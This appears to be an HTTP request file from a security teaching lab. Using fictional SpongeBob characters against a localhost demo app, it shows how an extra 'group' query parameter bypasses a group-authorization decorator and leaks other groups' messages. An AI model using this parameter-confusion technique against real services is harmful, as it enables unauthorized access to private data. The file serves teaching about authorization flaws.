@base = http://localhost:8000/ii/authz-binding/example14

### The group authorization check prevents Plankton from accessing the Krusty Krab's messages:
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in 403 Forbidden error:
#
# Forbidden: not a member of the requested group

###

### However, since the @check_group_membership_v1 decorator takes `group` from the query string
### if it's present, Plankton can present different `group` values to the authorization check
### and to the message retrieval, by adding a `group` query parameter with the value of his own group:
GET {{base}}/groups/staff@krusty-krab.sea/messages?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]

###

### This also works for the managers group:
GET {{base}}/groups/managers@krusty-krab.sea/messages?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
#   }
# ]

###

### The /user/messages endpoint is NOT vulnerable because it consistently uses query params
GET {{base}}/user/messages?group=staff@krusty-krab.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in 403 Forbidden (as expected):
#
# Forbidden: not a member of the requested group
